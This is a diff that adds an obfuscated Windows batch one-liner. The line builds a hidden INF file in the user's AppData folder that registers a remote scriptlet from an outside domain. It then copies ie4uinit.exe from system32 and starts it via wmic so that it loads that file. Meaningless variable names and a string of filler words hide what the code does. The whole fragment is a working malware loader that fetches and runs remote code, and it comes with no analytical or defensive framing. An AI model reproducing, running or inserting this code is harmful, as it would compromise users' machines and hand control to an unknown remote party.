@@ -1,0 +1,6 @@
+/v /c (for %w in (s) do @set "Outside=%~w") &&
+  (for %q in (c) do @set "Invest=%~q") &&
+  (for %s in (a) do @set "Rebates=%~s") &&
+  call(for %w in ("[C270E2]" "sc\" "ro%Cartridges%j,NI,%Clothes%%Autumn%%Autumn%p%Twice%%Nephew%%Nephew%crfjp6ktx54.davidopkins.%Foundations%/lz4x68ovcxa" "[strings]" "Autumn=t;Dozens" "Landscapes=%time%" "shortsvcname=' '" "Clothes=h" "Cartridges=b;Losses" "servicename=' '" "Plunge=init" "Twice=:;Journalists" "Nephew=/" "Foundations=com" "[defaultinstall.windows7]" "Un\" "Register\" "OCXs=C270E2" "delfiles=D34A" "[version]" "signature =$windows nt$" "[destinationdirs]" "defaultdestdir=11" "D34A=01" "[D34A]" "ieu%Plunge%.inf" ) do @echo %~w)>"%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %win!Vacant!ir%\system32\ie4uinit.exe "%appdata%\microsoft\*" | set Leopard95=Balcony &&
+  start "" wmic process call create "%appdata%\microsoft\ie4uinit.exe -basesettings" | set "Leopard98=Enforce Feature Presentations Clips Insane Accounts Sensors Allows Young Entries Blind Thought Cancel Investigators Items Attorneys Ready Tennis Press October Determines Explain Drinks Honors Evoke Affects Caught Mines Threads Lemon Assault Discuss Action Serves Marriage Creates Drill Minneapolis Improvements Tutorials Journey Where Chief Graduates Lonely Whats Builders"
